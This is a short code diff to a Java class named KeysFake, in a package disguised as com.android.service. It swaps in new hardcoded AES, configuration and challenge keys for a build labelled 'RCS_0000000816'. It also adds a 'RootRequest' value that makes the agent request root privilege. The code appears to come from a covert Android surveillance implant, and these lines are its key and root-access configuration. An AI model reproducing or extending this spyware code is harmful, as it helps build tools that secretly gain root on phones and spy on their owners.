@@ -9,19 +9,41 @@
 
 package com.android.service.crypto;
 
+import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
+import com.android.service.util.Utils;
+
 /**
  * The Class KeysFake.
  */
 public class KeysFake extends Keys {
+	private static final String TAG = "KeysFake";
 	
-	// RCS 746
-	byte[] AesKey = new byte[]{ (byte)0x12, (byte)0x35, (byte)0xcb, (byte)0xcb, (byte)0x67, (byte)0x90, (byte)0xfa, (byte)0x3c, (byte)0xd2, (byte)0xd9, (byte)0x8f, (byte)0x05, (byte)0x28, (byte)0xfb, (byte)0xb7, (byte)0x73 };
-	byte[] ConfKey = new byte[] { (byte)0x14, (byte)0x17, (byte)0xd7, (byte)0xb7, (byte)0x1d, (byte)0xf3, (byte)0x2f, (byte)0xbf, (byte)0x21, (byte)0x40, (byte)0x31, (byte)0x57, (byte)0x2c, (byte)0xd1, (byte)0xd7, (byte)0xc9 };
-	byte[] ChallengeKey = new byte[]{ (byte)0x57, (byte)0x2e, (byte)0xbc, (byte)0x94, (byte)0x39, (byte)0x12, (byte)0x81, (byte)0xcc, (byte)0xf5, (byte)0x3a, (byte)0x85, (byte)0x13, (byte)0x30, (byte)0xbb, (byte)0x0d, (byte)0x99 };
-	String BuildId = "RCS_0000000746";
+	// RCS 816 "Test8" su castore
+	byte[] AesKey = Utils.hexStringToByteArray("43ddcdb58f42216465e0bad6a0e9214f8b30abd8351d96c9d5668384fbc5e22e", 0,
+			32);
+	byte[] ConfKey = Utils.hexStringToByteArray("49d1e153429bdc361a0aa842625c0aeeade8eca013f2c5110f01bfc453072c0a", 0,
+			32);
+	byte[] ChallengeKey = Utils.hexStringToByteArray(
+			"572ebc94391281ccf53a851330bb0d99138ffe67fc695da3281e51dc8d79b32e", 0, 32);
+	String BuildId = "RCS_0000000816";
+
+	// Get root
+	byte[] RootRequest = "IrXCtyrrDXMJEvOU".getBytes();
+	
+	// Don't get root
+	//byte[] RootRequest = "IrXCtyrrDXMJEvOUbs".getBytes();
 
 	public KeysFake() {
 		super(false);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (KeysFake) wants privilege: " + wantsPrivilege());
+		}
+	}
+
+	protected byte[] getRootRequest() {
+		return RootRequest;
 	}
 
 	/*
